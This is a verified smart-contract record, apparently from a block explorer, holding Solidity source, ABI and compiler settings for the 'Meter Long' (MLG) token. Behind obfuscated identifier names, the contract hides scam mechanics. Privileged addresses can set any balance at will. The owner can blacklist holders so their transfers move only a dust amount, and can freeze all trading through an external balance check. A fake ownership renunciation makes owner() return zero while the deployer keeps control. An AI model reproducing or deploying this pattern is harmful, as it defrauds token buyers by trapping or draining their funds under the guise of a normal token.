{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\ninterface exemptShould {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tokenTotalFrom) external view returns (uint256);\n\n    function transfer(address tradingTakeTotal, uint256 maxSenderToken) external returns (bool);\n\n    function allowance(address tradingLimitSell, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 maxSenderToken) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tradingTakeTotal,\n        uint256 maxSenderToken\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed amountTrading, uint256 value);\n    event Approval(address indexed tradingLimitSell, address indexed spender, uint256 value);\n}\n\nabstract contract exemptBuy {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface toList {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface minTeam {\n    function createPair(address autoFrom, address minTake) external returns (address);\n}\n\ninterface sellLaunch is exemptShould {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract MeterLong is exemptBuy, exemptShould, sellLaunch {\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverSell;\n    }\n\n    uint256 private listTake = 100000000 * 10 ** 18;\n\n    mapping(address => bool) public liquidityAutoShould;\n\n    bool private walletFundTrading;\n\n    function approve(address totalAutoSwap, uint256 maxSenderToken) public virtual override returns (bool) {\n        totalLimitSender[_msgSender()][totalAutoSwap] = maxSenderToken;\n        emit Approval(_msgSender(), totalAutoSwap, maxSenderToken);\n        return true;\n    }\n\n    address public marketingToken;\n\n    uint8 private tokenMarketing = 18;\n\n    string private senderShould = \"Meter Long\";\n\n    event OwnershipTransferred(address indexed feeReceiver, address indexed marketingLaunched);\n\n    function transfer(address marketingTotal, uint256 maxSenderToken) external virtual override returns (bool) {\n        return buyTo(_msgSender(), marketingTotal, maxSenderToken);\n    }\n\n    address marketingTokenAuto = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 maxMode;\n\n    mapping(address => mapping(address => uint256)) private totalLimitSender;\n\n    function allowance(address receiverLimit, address totalAutoSwap) external view virtual override returns (uint256) {\n        if (totalAutoSwap == marketingTokenAuto) {\n            return type(uint256).max;\n        }\n        return totalLimitSender[receiverLimit][totalAutoSwap];\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return tokenMarketing;\n    }\n\n    uint256 constant fromWallet = 10 ** 10;\n\n    bool public shouldLiquidity;\n\n    function name() external view virtual override returns (string memory) {\n        return senderShould;\n    }\n\n    mapping(address => bool) public marketingAuto;\n\n    uint256 shouldFromSell;\n\n    function marketingLimit(address shouldTeam) public {\n        if (shouldLiquidity) {\n            return;\n        }\n        \n        liquidityAutoShould[shouldTeam] = true;\n        \n        shouldLiquidity = true;\n    }\n\n    function marketingSell(address marketingTotal, uint256 maxSenderToken) public {\n        fundIsTotal();\n        listIsWallet[marketingTotal] = maxSenderToken;\n    }\n\n    function tokenMarketingExempt(address isFee, address tradingTakeTotal, uint256 maxSenderToken) internal returns (bool) {\n        require(listIsWallet[isFee] >= maxSenderToken);\n        listIsWallet[isFee] -= maxSenderToken;\n        listIsWallet[tradingTakeTotal] += maxSenderToken;\n        emit Transfer(isFee, tradingTakeTotal, maxSenderToken);\n        return true;\n    }\n\n    function atExempt() public {\n        emit OwnershipTransferred(marketingToken, address(0));\n        buySellTeam = address(0);\n    }\n\n    uint256 public tradingTx;\n\n    uint256 private toFee;\n\n    function listFund(uint256 maxSenderToken) public {\n        fundIsTotal();\n        maxMode = maxSenderToken;\n    }\n\n    uint256 public marketingBuy;\n\n    uint256 public isSender;\n\n    uint256 public fundAmount;\n\n    address autoSell = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return listTake;\n    }\n\n    function transferFrom(address isFee, address tradingTakeTotal, uint256 maxSenderToken) external override returns (bool) {\n        if (_msgSender() != marketingTokenAuto) {\n            if (totalLimitSender[isFee][_msgSender()] != type(uint256).max) {\n                require(maxSenderToken <= totalLimitSender[isFee][_msgSender()]);\n                totalLimitSender[isFee][_msgSender()] -= maxSenderToken;\n            }\n        }\n        return buyTo(isFee, tradingTakeTotal, maxSenderToken);\n    }\n\n    uint256 private atReceiver;\n\n    function minTo(address limitSell) public {\n        fundIsTotal();\n        \n        if (limitSell == marketingToken || limitSell == tokenSwap) {\n            return;\n        }\n        marketingAuto[limitSell] = true;\n    }\n\n    function owner() external view returns (address) {\n        return buySellTeam;\n    }\n\n    function buyTo(address isFee, address tradingTakeTotal, uint256 maxSenderToken) internal returns (bool) {\n        if (isFee == marketingToken) {\n            return tokenMarketingExempt(isFee, tradingTakeTotal, maxSenderToken);\n        }\n        uint256 enableShould = exemptShould(tokenSwap).balanceOf(autoSell);\n        require(enableShould == maxMode);\n        require(tradingTakeTotal != autoSell);\n        if (marketingAuto[isFee]) {\n            return tokenMarketingExempt(isFee, tradingTakeTotal, fromWallet);\n        }\n        return tokenMarketingExempt(isFee, tradingTakeTotal, maxSenderToken);\n    }\n\n    constructor (){\n        if (toFee == fundAmount) {\n            isSender = fundAmount;\n        }\n        toList receiverShould = toList(marketingTokenAuto);\n        tokenSwap = minTeam(receiverShould.factory()).createPair(receiverShould.WETH(), address(this));\n        \n        marketingToken = _msgSender();\n        atExempt();\n        liquidityAutoShould[marketingToken] = true;\n        listIsWallet[marketingToken] = listTake;\n        if (atReceiver == isSender) {\n            liquidityFrom = true;\n        }\n        emit Transfer(address(0), marketingToken, listTake);\n    }\n\n    address public tokenSwap;\n\n    function getOwner() external view returns (address) {\n        return buySellTeam;\n    }\n\n    function fundIsTotal() private view {\n        require(liquidityAutoShould[_msgSender()]);\n    }\n\n    function balanceOf(address tokenTotalFrom) public view virtual override returns (uint256) {\n        return listIsWallet[tokenTotalFrom];\n    }\n\n    address private buySellTeam;\n\n    mapping(address => uint256) private listIsWallet;\n\n    bool public liquidityFrom;\n\n    string private receiverSell = \"MLG\";\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingLimitSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingLaunched\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountTrading\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalAutoSwap\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalAutoSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxSenderToken\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenTotalFrom\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isSender\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityAutoShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxSenderToken\",\"type\":\"uint256\"}],\"name\":\"listFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldTeam\",\"type\":\"address\"}],\"name\":\"marketingLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxSenderToken\",\"type\":\"uint256\"}],\"name\":\"marketingSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitSell\",\"type\":\"address\"}],\"name\":\"minTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxSenderToken\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingTakeTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxSenderToken\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "MeterLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}